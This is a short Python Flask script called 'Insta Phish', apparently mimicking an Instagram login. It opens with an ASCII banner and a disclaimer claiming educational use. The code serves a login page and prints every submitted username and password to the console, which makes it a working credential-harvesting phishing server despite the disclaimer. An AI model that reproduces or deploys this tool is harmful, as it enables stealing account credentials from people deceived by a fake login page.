from flask import Flask, request, render_template


print("""
  _____           _                     _____  _     _     _
 |_   _|         | |                   |  __ \| |   (_)   | |
   | |  _ __  ___| |_ __ _             | |__) | |__  _ ___| |__
   | | | '_ \/ __| __/ _` |            |  ___/| '_ \| / __| '_ \
  _| |_| | | \__ \ || (_| |            | |    | | | | \__ \ | | |
 |_____|_| |_|___/\__\__,_|            |_|    |_| |_|_|___/_| |_|

Disclaimer:
Usage of Insta Phish for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program.

This tool is created for educational purposes and I do not encourage anyone to perform any illegal or malicious activities like phishing which may harm or impact other people.


""")

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        print('Username:', username)
        print('Password:', password)
    return render_template('login.html')

if __name__ == '__main__':
    app.run()
